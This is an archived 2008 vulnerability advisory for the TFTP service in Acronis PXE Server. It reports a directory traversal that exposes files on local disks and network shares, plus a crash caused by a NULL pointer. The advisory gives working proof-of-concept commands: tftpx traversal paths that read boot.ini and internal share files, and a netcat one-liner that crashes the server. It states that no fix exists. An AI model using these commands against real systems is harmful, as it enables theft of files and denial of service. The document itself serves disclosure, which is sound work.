@@ -1,0 +1,98 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  Acronis PXE Server
+              http://www.acronis.com/enterprise/products/snapdeploy/
+Versions:     <= 2.0.0.1076
+Platforms:    Windows
+Bugs:         A] directory traversal
+              B] NULL pointer
+Exploitation: remote
+Date:         08 Mar 2008
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bugs
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+The Acronis PXE Server is an essential component of Acronis Snap Deploy
+Server, a deployment solution for automatically configuring all the
+clients of the local network.
+
+
+#######################################################################
+
+=======
+2) Bugs
+=======
+
+----------------------
+A] directory traversal
+----------------------
+
+The PXE Server (pxesrv.exe) implements a TFTP server for allowing the
+downloading of the bootstrap files (uploading is not allowed).
+This service is vulnerable to a classical directory traversal and an
+arbitrary path attacks which allow an attacker to download any file
+from the local disks or the network shares.
+
+
+---------------
+B] NULL pointer
+---------------
+
+An incomplete TFTP request (anything which goes from the simple absence
+of the option field to the usage of only the 2 bytes for the opcode)
+causes the crashing of the PXE Server due to a NULL pointer access.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+A]
+http://aluigi.org/testz/tftpx.zip
+
+  tftpx SERVER ..\../..\../boot.ini none
+  tftpx SERVER c:\boot.ini none
+  tftpx SERVER \\internal_host\documents\file.txt none
+
+B]
+send the bytes 00 01 to UDP port 69 of the server:
+
+  echo -n -e \x00\x01|nc SERVER 69 -v -v -u
+
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix
+
+
+#######################################################################
+
+# milw0rm.com [2008-03-10]
